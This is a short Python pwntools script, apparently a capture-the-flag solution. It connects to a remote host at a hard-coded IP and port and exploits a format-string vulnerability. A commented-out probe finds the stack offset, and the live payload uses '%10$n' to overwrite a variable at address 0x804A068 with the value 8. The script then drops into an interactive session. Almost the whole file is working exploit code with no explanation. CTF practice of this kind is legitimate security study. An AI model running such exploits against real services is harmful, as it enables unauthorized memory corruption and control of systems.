from pwn import *

r = remote('61.147.171.105', 55061)
context.log_level = 'debug'

# payload = b'aaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'  # 偏移为10
# r.sendlineafter(b'name:', b'admin')
# r.sendlineafter(b'please:', payload)
pwnme_addr = 0x804A068

payload = p32(pwnme_addr) + b'A' * 4 + b'%10$n'  # 覆盖为 4+4=8
r.sendlineafter(b'name:', b'admin')
r.sendlineafter(b'please:', payload)
r.interactive()
